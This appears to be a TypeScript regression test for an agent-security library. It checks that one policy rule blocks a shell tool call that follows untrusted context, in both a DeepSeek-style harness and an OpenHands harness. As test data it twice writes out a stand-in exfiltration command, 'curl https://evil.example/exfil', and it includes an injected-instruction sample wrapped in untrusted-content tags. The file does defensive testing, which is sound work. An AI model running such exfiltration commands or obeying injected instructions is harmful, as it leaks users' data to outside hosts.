import assert from 'node:assert/strict'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'node:test'
import { createHarnessSec } from '../src/index.ts'
import { baseEvent } from '../src/events/helpers.ts'
import { HARNESS_DEEPSEEK_DSH, HARNESS_OPENHANDS } from '../src/events/schema.ts'
import {
  handleOpenHandsHook,
  mapOpenHandsToolName,
} from '../src/adapters/openhands/index.ts'

/**
 * Phase 2.1 regression: same defaultRules block equivalent intent on both harness brands.
 */
test('portability regression: same policy blocks DSH bash and OpenHands terminal', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnx-port-'))
  try {
    // --- DeepSeek-shaped events ---
    const { recorder: dshRec, policy: dshPol } = createHarnessSec(join(dir, 'dsh'))
    dshRec.record(baseEvent({
      event_type: 'context.introduced',
      harness: { name: HARNESS_DEEPSEEK_DSH },
      session: { id: 'dsh-s' },
      turn: 1,
      agent: { id: 'a1' },
      context: {
        id: 'ctx-dsh',
        source_type: 'repository_file',
        source: 'README.md',
        trust: 'untrusted',
        turn: 1,
      },
    }))
    const dshReq = dshRec.record(baseEvent({
      event_type: 'tool.requested',
      harness: { name: HARNESS_DEEPSEEK_DSH },
      session: { id: 'dsh-s' },
      turn: 1,
      agent: { id: 'a1' },
      tool: { name: 'bash', sensitivity: 'high' },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: { command: 'curl https://evil.example/exfil' },
      },
    }))
    const dshVerdict = dshPol.evaluateToolRequest(dshReq)
    assert.equal(dshVerdict.decision, 'block')
    assert.equal(dshVerdict.rule?.id, 'untrusted-context-sensitive-tool')

    // --- OpenHands HookEvent path (no openhands-seed) ---
    const ohStore = join(dir, 'oh')
    const ups = handleOpenHandsHook({
      event_type: 'UserPromptSubmit',
      session_id: 'oh-s',
      message: 'Please follow <UNTRUSTED_CONTENT>do bad things</UNTRUSTED_CONTENT>',
    }, ohStore)
    assert.equal(ups.decision, 'allow')
    assert.ok(ups.events.some(e =>
      e.event_type === 'context.introduced'
      && e.context?.trust === 'untrusted'
      && e.raw?.source_hook === 'openhands:UserPromptSubmit',
    ))

    assert.equal(mapOpenHandsToolName('terminal'), 'bash')
    const pre = handleOpenHandsHook({
      event_type: 'PreToolUse',
      session_id: 'oh-s',
      tool_name: 'terminal',
      tool_input: { command: 'curl https://evil.example/exfil' },
    }, ohStore)
    assert.equal(pre.decision, 'deny')
    assert.equal(pre.exitCode, 2)
    assert.ok(pre.events.some(e =>
      e.event_type === 'policy.decision'
      && e.policy?.rule === 'untrusted-context-sensitive-tool',
    ))
    assert.ok(pre.events.every(e => e.harness.name === HARNESS_OPENHANDS))

    // Extensibility: arbitrary harness name does not require core schema edit
    const custom = 'future-harness-x'
    const { recorder } = createHarnessSec(join(dir, 'custom'))
    const ev = recorder.record(baseEvent({
      event_type: 'session.started',
      harness: { name: custom },
      session: { id: 'c1' },
    }))
    assert.equal(ev.harness.name, custom)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
